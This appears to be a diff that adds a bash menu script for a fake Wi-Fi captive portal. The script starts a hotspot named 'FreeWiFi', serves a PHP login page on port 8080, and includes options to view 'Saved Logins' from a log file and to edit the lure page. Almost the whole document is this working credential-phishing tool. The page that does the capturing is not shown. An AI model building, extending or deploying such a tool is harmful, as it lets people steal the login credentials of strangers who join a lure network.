@@ -1,0 +1,53 @@
+#!/bin/bash
+
+PORTAL_DIR="portal"
+LOG_FILE="logs/log.txt"
+
+start_hotspot() {
+    echo "[+] Starting hotspot..."
+    nmcli dev wifi hotspot ifname wlan0 ssid FreeWiFi password 12345678
+}
+
+start_server() {
+    echo "[+] Starting portal server..."
+    cd $PORTAL_DIR || exit
+    php -S 0.0.0.0:8080
+}
+
+stop_hotspot() {
+    echo "[+] Stopping hotspot..."
+    nmcli connection down Hotspot
+}
+
+view_logs() {
+    echo "---- Saved Logins ----"
+    cat $LOG_FILE
+    echo "----------------------"
+}
+
+edit_page() {
+    nano portal/index.html
+}
+
+while true; do
+    echo ""
+    echo "====== WiFi Portal Tool ======"
+    echo "1) Start Hotspot"
+    echo "2) Start Login Page Server"
+    echo "3) Stop Hotspot"
+    echo "4) View Saved Logins"
+    echo "5) Edit Login Page"
+    echo "6) Exit"
+    echo "=============================="
+    read -p "Select option: " choice
+
+    case $choice in
+        1) start_hotspot ;;
+        2) start_server ;;
+        3) stop_hotspot ;;
+        4) view_logs ;;
+        5) edit_page ;;
+        6) echo "Exiting..."; exit ;;
+        *) echo "Invalid option" ;;
+    esac
+done
